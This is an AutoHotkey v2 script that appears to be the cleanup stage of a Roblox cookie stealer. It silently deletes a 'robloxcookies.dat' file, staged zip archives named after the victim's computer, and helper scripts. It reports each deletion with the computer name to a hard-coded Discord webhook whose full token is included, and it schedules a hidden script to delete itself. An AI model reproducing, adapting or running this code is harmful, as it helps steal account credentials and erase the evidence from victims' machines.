#Requires AutoHotkey v2.0
#SingleInstance Force
#NoTrayIcon

wkUrl := "https://discord.com/api/webhooks/1383142535136018552/PPFKXJEV71jNIareD20kRU9iLwuCvWytj08itta7gPw1XbNjw7ciXZhcsdTXM81s07aE"

SetTimer(ScheduleSelfDestruct, -1)  ; Schedule this script to delete itself after a short delay

CleanUpTemp()
ExitApp

CleanUpTemp() {
    tempDir := A_AppData "\PerformanceRun2"
    Sleep 5000
    NDWithLocation("Attempting to delete: " . tempDir)

    if DirExist(tempDir) {
        try {
            Loop Files, tempDir "\*", "R" {
                FileSetAttrib("-R", A_LoopFileFullPath, true)
            }
            DirDelete(tempDir, true)
            NDWithLocation("- ✅ Deleted folder: " . tempDir)
        } catch as e {
            NDWithLocation("- ❌ FAILED to delete folder: " . tempDir . "`nReason: " . e.Message)
        }
    } else {
        NDWithLocation("- Folder not found: " . tempDir)
    }

    tempPath := A_Temp
    pcName := EnvGet("COMPUTERNAME")

    for fileName in ["a.ahk", "b.ahk", "robloxcookies.dat"] {
        filePath := tempPath "\" fileName
        if FileExist(filePath) {
            FileDelete(filePath)
            NDWithLocation("- Deleted file: " . fileName)
        } else {
            NDWithLocation("- File not found: " . fileName)
        }
    }

    pattern := "*" pcName "_part1.zip"
    foundAny := false
    Loop Files, tempPath "\" pattern {
        foundAny := true
        FileDelete(A_LoopFileFullPath)
        NDWithLocation("- Deleted file: " . A_LoopFileName)
    }
    if !foundAny
        NDWithLocation("- No files found matching: " . pattern)

    sejZip := "Sejtype-" pcName ".zip"
    sejZipPath := tempPath "\" sejZip
    if FileExist(sejZipPath) {
        FileDelete(sejZipPath)
        NDWithLocation("- Deleted file: " . sejZip)
    } else {
        NDWithLocation("- File not found: " . sejZip)
    }

    sejFolder := "Sejtype-" pcName
    sejFolderPath := tempPath "\" sejFolder
    if DirExist(sejFolderPath) {
        DirDelete(sejFolderPath, true)
        NDWithLocation("- Deleted folder: " . sejFolder)
    } else {
        NDWithLocation("- Folder not found: " . sejFolder)
    }
}

ScheduleSelfDestruct(scriptPath) {
    Sleep 5000  ; Let everything else settle

    try {
        deleterPath := A_Temp "\c.ahk"

        ; Build the content to delete the original script
        scriptContent := "
        (
        Sleep 2000
        FileDelete '" scriptPath "'
        ExitApp
        )"

        FileAppend(scriptContent, deleterPath)

        ; Run the deleter silently
        Run('"' deleterPath '"', , "Hide")
    } catch as e {
        NDWithLocation("❌ Failed to schedule self-destruct: " . e.Message)
    }
}

NDWithLocation(msg) {
    try {
        pc := EnvGet("COMPUTERNAME")
        timestamp := FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
        ND("[" . pc . "] " . msg . " @ " . timestamp)
    } catch {
        ND("- [Geo/IP unavailable] - " . msg)
    }
}

ND(msg) {
    global wkUrl
    try {
        json := "{" Chr(34) "content" Chr(34) ":" Chr(34) msg Chr(34) "}"
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("POST", wkUrl, false)
        http.SetRequestHeader("Content-Type", "application/json")
        http.Send(json)
    } catch {
        ; Silently fail
    }
}
